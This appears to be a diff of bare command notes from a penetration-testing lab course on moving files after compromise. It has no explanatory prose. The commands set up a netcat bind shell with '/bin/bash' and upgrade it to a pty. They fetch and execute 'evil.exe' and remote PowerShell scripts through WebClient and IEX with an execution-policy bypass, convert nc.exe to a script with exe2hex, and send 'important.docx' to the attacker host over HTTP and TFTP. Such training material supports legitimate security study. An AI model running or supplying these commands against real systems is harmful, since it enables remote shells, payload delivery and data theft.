@@ -1,1 +1,152 @@
+Installing Pure-FTPd 
 
+sudo apt update && sudo apt install pure-ftpd
+
+cat ./setup-ftp.sh
+
+chmod +x setup-ftp.sh
+
+sudo ./setup-ftp.sh
+
+
+
+
+The Non-Interactive Shell 
+
+ftp 10.11.0.4
+
+offsec
+
+nc -lvnp 4444 -e /bin/bash
+
+nc -vn 10.11.0.128 4444
+
+
+
+
+Upgrading a Non-Interactive Shell 
+
+nc -vn 10.11.0.128 4444
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+ftp 10.11.0.4
+
+
+
+Non-Interactive FTP Download
+
+ ftp -h
+ 
+sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
+
+ls /ftphome/
+
+sudo systemctl restart pure-ftpd
+
+echo open 10.11.0.4 21> ftp.txt
+
+echo USER offsec>> ftp.txt
+
+echo lab>> ftp.txt
+
+echo bin >> ftp.txt
+
+echo GET nc.exe >> ftp.txt
+
+echo bye >> ftp.txt
+
+ftp -v -n -s:ftp.txt
+
+ftp -v -n -s:ftp.txt
+
+nc.exe -h
+
+
+
+
+
+Windows Downloads Using Scripting Languages 
+
+cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+
+> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+
+echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+ 
+echo $file = "new-exploit.exe" >>wget.ps1
+
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
+NoProfile -File wget.ps1
+
+powershell.exe (New-Object
+System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+
+sudo cat helloworld.ps1 
+
+powershell.exe IEX (New-Object
+System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+
+
+
+
+
+
+
+Windows Downloads with exe2hex and PowerShell
+
+locate nc.exe | grep binaries
+ 
+cp /usr/share/windows-resources/binaries/nc.exe .
+ 
+ls -lh nc.exe
+ 
+upx -9 nc.exe
+
+ls -lh nc.exe
+
+exe2hex -x nc.exe -p nc.cmd
+
+head nc.cmd
+
+nc -h
+
+
+
+
+
+
+Windows Uploads Using Windows Scripting Languages 
+
+sudo mkdir /var/www/uploads
+
+ps -ef | grep apache
+ 
+sudo chown www-data: /var/www/uploads
+
+ls -la
+
+powershell (New-Object
+System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+
+ls -la
+
+
+
+
+
+
+
+Uploading Files with TFTP
+
+sudo apt update && sudo apt install atftp
+
+sudo mkdir /tftp
+
+sudo chown nobody: /tftp
+
+sudo atftpd --daemon --port 69 /tftp
+
+tftp -i 10.11.0.4 put important.docx
